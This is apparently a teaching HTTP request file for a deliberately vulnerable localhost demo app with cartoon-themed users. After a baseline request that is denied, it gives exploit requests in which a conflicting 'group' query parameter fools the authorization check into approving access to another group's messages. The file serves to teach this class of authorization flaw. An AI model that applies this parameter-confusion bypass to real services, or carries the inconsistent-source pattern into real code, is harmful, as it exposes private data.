@base = http://localhost:8000/confusion/authz-binding/example3

### Authorization check prevents Plankton from accessing Krusty Krab messages
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in 403 Forbidden:
# Forbidden: not a member of the requested group

###

### EXPLOIT: Despite using a global source of truth (g.group), Plankton can still
### rebind the resource by exploiting query-priority logic and inconsistent source usage
GET {{base}}/groups/staff@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# The decorator sets g.group from query param (staff@chum-bucket.sea) for authorization,
# but the handler still uses the path param (staff@krusty-krab.sea) for data retrieval

###

### Same vulnerability applies to managers group
GET {{base}}/groups/managers@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Plankton accesses the secret formula despite "single source of truth" pattern!
